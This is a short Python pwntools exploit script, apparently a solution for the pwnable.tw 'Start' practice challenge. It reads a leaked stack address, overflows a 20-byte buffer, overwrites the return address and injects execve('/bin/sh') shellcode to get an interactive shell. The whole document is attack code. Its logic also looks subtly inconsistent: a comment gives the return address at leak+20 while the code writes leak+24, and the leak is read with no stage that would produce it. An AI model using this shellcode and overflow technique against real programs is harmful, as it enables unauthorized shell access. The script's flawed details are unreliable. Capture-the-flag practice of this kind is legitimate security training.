
from pwn import *

# Set up the target binary
binary_path = "./samples/PwnableTW/Start/start"
elf = ELF(binary_path)

# Start the process
p = process(binary_path)

# Receive the leaked stack address
p.recvuntil(b"Start :")
leaked_stack_address = u32(p.recv(4))
log.info(f"Leaked stack address: {hex(leaked_stack_address)}")

# Craft shellcode for execve("/bin/sh", NULL, NULL)
shellcode = b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

# Construct the payload
# Fill the 20-byte buffer with junk
# Overwrite the return address (at leaked_stack_address + 20) with the address of our shellcode
# Place the shellcode immediately after the overwritten return address
payload = b"A" * 20 + p32(leaked_stack_address + 20 + 4) + shellcode

log.info(f"Payload length: {len(payload)}")
log.info(f"Payload: {payload}")

# Send the payload
p.sendline(payload)

# Interact with the shell
p.interactive()
